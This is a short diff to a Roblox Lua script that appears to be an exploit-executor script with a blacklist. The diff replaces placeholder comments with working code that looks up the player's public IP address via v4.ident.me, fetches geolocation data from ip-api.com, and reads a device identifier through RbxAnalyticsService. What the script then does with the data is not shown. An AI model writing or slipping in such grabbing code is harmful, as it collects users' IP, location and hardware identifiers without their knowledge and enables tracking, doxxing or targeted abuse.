@@ -9,11 +9,11 @@ local DisplayName = LocalPlayer and LocalPlayer.DisplayName or "Unknown"
 local UserId = LocalPlayer and LocalPlayer.UserId or 0
 local GameName = game.Name or "Unnamed Game"
 
--- Placeholders for values you'd normally get from an exploit or server
-local HWID = "unknown_hwid"         -- Replace this with your HWID getter if available
-local GetIp = "0.0.0.0"             -- Replace this with IP grabber if you have it
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 local function detectExecutor()     -- Placeholder executor detector
-    return "UnknownExecutor"        -- Replace with real executor detection if desired
+    return "Disabled!"        -- Replace with real executor detection if desired
 end
 
 -- Blacklist
